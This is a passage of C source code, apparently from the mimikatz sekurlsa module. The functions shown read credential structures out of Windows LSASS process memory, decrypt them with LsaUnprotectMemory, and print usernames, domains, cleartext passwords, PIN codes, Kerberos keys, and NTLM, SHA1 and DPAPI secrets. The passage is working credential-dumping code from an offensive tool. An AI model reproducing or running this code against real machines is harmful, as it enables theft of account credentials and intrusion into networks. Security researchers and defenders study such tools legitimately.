					pRpceCredentialKeyCreds = (PRPCE_CREDENTIAL_KEYCREDENTIAL) credentials->Buffer;
					base = (PBYTE) pRpceCredentialKeyCreds + sizeof(RPCE_CREDENTIAL_KEYCREDENTIAL) + (pRpceCredentialKeyCreds->unk0 - 1) * sizeof(MARSHALL_KEY);
					for (i = 0; i < pRpceCredentialKeyCreds->unk0; i++)
						kuhl_m_sekurlsa_genericKeyOutput(&pRpceCredentialKeyCreds->key[i], &base);
					break;
				default:
					kprintf(L"\n\t * Raw data : ");
					kull_m_string_wprintf_hex(credentials->Buffer, credentials->Length, 1);
				}
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE)
		{
			if(mesCreds->UserName.Buffer)
			{
				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->UserName.Buffer, mesCreds->UserName.MaximumLength);
					kprintf(L"\n\t * PIN code : %wZ", &mesCreds->UserName);
					LocalFree(mesCreds->UserName.Buffer);
				}
			}
		}
		else if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_KEY_LIST)
		{
			pHashPassword = (PKERB_HASHPASSWORD_GENERIC) mesCreds;
			kprintf(L"\t   %s ", kuhl_m_kerberos_ticket_etype(pHashPassword->Type));
			if(buffer.Length = buffer.MaximumLength = (USHORT) pHashPassword->Size)
			{
				buffer.Buffer = (PWSTR) pHashPassword->Checksump;
				if(kull_m_string_getUnicodeString(&buffer, cLsass.hLsassMem))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						(*lsassLocalHelper->pLsaUnprotectMemory)(buffer.Buffer, buffer.MaximumLength);
					kull_m_string_wprintf_hex(buffer.Buffer, buffer.Length, 0);
					LocalFree(buffer.Buffer);
				}
			}
			else kprintf(L"<no size, buffer is incorrect>");
			kprintf(L"\n");
		}
		else
		{
			if(mesCreds->UserName.Buffer || mesCreds->Domaine.Buffer || mesCreds->Password.Buffer)
			{
				if(kull_m_string_getUnicodeString(&mesCreds->UserName, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->UserName))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						username = &mesCreds->UserName;
					else
						domain = &mesCreds->UserName;
				}
				if(kull_m_string_getUnicodeString(&mesCreds->Domaine, cLsass.hLsassMem) && kull_m_string_suspectUnicodeString(&mesCreds->Domaine))
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_DOMAIN))
						domain = &mesCreds->Domaine;
					else
						username = &mesCreds->Domaine;
				}
				if(kull_m_string_getUnicodeString(&mesCreds->Password, cLsass.hLsassMem) /*&& !kull_m_string_suspectUnicodeString(&mesCreds->Password)*/)
				{
					if(!(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT)/* && *lsassLocalHelper->pLsaUnprotectMemory*/)
						(*lsassLocalHelper->pLsaUnprotectMemory)(mesCreds->Password.Buffer, mesCreds->Password.MaximumLength);
					password = &mesCreds->Password;
				}

				if(password || !(flags & KUHL_SEKURLSA_CREDS_DISPLAY_WPASSONLY))
				{
					kprintf((flags & KUHL_SEKURLSA_CREDS_DISPLAY_LINE) ?
						L"%wZ\t%wZ\t"
						:
						L"\n\t * Username : %wZ"
						L"\n\t * Domain   : %wZ"
						L"\n\t * Password : "
						, username, domain);

					if(!password || kull_m_string_suspectUnicodeString(password))
					{
						if((flags & KUHL_SEKURLSA_CREDS_DISPLAY_CREDMANPASS) && password)
							kprintf(L"%.*s", password->Length / sizeof(wchar_t), password->Buffer);
						else
							kprintf(L"%wZ", password);
					}
					else kull_m_string_wprintf_hex(password->Buffer, password->Length, 1);
				}

				LocalFree(mesCreds->UserName.Buffer);
				LocalFree(mesCreds->Domaine.Buffer);
				LocalFree(mesCreds->Password.Buffer);
			}
		}
		if(flags & KUHL_SEKURLSA_CREDS_DISPLAY_NEWLINE)
			kprintf(L"\n");
	}
	else kprintf(L"LUID KO\n");
}

VOID kuhl_m_sekurlsa_genericKeyOutput(PMARSHALL_KEY key, PVOID * dirtyBase)
{
	if(key && key->unkId)
	{
		switch(key->unkId)
		{
		case 0x00010002:
		case 0x00010003:
			kprintf(L"\n\t * NTLM     : ");
			break;
		case 0x00020002:
			kprintf(L"\n\t * SHA1     : ");
			break;
		case 0x00030002:
		case 0x00030003:
			kprintf(L"\n\t * RootKey  : ");
			break;
		case 0x00040002:
		case 0x00040003:
			kprintf(L"\n\t * DPAPI    : ");
			break;
		default:
			kprintf(L"\n\t * %08x : ", key->unkId);
		}
		kull_m_string_wprintf_hex((PBYTE) *dirtyBase + sizeof(ULONG), key->length, 0);
		*dirtyBase = (PBYTE) *dirtyBase + sizeof(ULONG) + *(PULONG) *dirtyBase;
	}
}